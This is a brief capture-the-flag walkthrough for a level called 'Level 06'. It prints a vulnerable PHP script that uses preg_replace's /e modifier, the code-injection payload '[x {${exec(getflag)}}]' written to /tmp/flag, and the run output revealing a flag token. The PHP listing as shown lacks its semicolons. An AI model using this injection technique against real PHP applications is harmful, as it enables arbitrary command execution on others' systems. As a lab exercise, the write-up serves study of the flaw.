## Level 06
                echo '[x {${exec(getflag)}}]' > /tmp/flag


In this level we have a php script

    #!/usr/bin/php
    <?php
    function y($m) { $m = preg_replace("/\./", " x ", $m)
    $m = preg_replace("/@/", " y", $m)
    return $m
    }
    function x($y, $z) { $a = file_get_contents($y)
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a)
    $a = preg_replace("/\[/", "(", $a)
    $a = preg_replace("/\]/", ")", $a)
    return $a
    }
    $r = x($argv[1], $argv[2])
    print $r

    ?>

we have to found a way to give him getflag as argument, it will trunc some elements in the argument given so '[x {${exec(getflag)}}] will execute /bin/getflag

we have to output this in a file -> echo '[x {${exec(getflag)}}]' > /tmp/flag

./level06 /tmp/flag

    PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
    PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
